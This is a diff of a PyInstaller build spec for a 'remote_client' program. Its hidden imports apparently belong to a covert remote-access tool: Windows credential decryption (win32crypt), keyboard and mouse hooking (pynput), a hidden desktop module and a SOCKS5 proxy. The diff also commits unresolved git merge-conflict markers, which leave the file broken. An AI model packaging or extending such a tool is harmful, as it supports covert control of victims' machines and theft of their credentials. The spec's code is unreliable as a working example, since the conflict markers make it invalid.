@@ -1,7 +1,11 @@
 # -*- mode: python ; coding: utf-8 -*-
 from PyInstaller.utils.hooks import collect_all
 
+<<<<<<< HEAD
 datas = [('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_7clw39me\\remote_client\\rc_team_id.txt', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_7clw39me\\remote_client\\rc_antifraud.json', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_7clw39me\\remote_client\\rc_server.json', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_7clw39me\\remote_client\\rc_activity.env', 'remote_client')]
+=======
+datas = [('C:\\Users\\abdul\\AppData\\Local\\Temp\\rc_build_lmx85xaz\\remote_client\\rc_team_id.txt', 'remote_client'), ('C:\\Users\\abdul\\AppData\\Local\\Temp\\rc_build_lmx85xaz\\remote_client\\rc_antifraud.json', 'remote_client'), ('C:\\Users\\abdul\\AppData\\Local\\Temp\\rc_build_lmx85xaz\\remote_client\\rc_server.json', 'remote_client')]
+>>>>>>> cd0db9a0ab342cb39e3ab6b3d2910d7fa66b6dc1
 binaries = []
 hiddenimports = ['win32crypt', 'cryptography', 'pynput', 'pynput.mouse', 'pynput.keyboard', 'remote_client.apps', 'remote_client.apps.launcher', 'remote_client.windows.hidden_desktop', 'remote_client.proxy.socks5_server']
 tmp_ret = collect_all('pynput')
